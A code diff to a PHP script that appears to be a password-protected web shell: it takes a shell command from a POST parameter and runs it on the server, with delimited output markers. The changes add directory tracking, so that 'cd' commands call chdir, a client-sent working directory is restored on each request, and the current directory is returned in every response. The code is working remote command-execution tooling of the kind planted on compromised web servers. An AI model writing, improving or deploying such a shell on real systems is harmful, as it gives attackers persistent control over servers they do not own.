@@ -9,6 +9,7 @@ define("PASSWORD", $password);
 
 function respond($code, $data)
 {
+    $data = array_merge(array("cwd" => getcwd()), $data);
     $delimiter = $_POST["delimiter"];
     $start = "MERSHELLES_START_" . $delimiter;
     $end = "MERSHELLES_END_" . $delimiter;
@@ -60,6 +61,17 @@ function exec_cmd($cmd)
 function handleExec()
 {
     $cmd = $_POST["command"];
+
+    if (substr($cmd, 0, 2) === "cd") {
+        $dir = trim(substr($cmd, 2));
+        if (is_dir($dir)) {
+            chdir($dir);
+            success(array("output" => ""));
+        } else {
+            error("Directory does not exist!");
+        }
+    }
+
     $output = exec_cmd($cmd);
     success(array("output" => $output));
 }
@@ -104,6 +116,11 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     if ($type !== "auth") {
         checkAuth();
     }
+
+    if (isset($_POST["cwd"]) && is_dir($_POST["cwd"])) {
+        chdir($_POST["cwd"]);
+    }
+
 
     switch ($type) {
         case "auth":
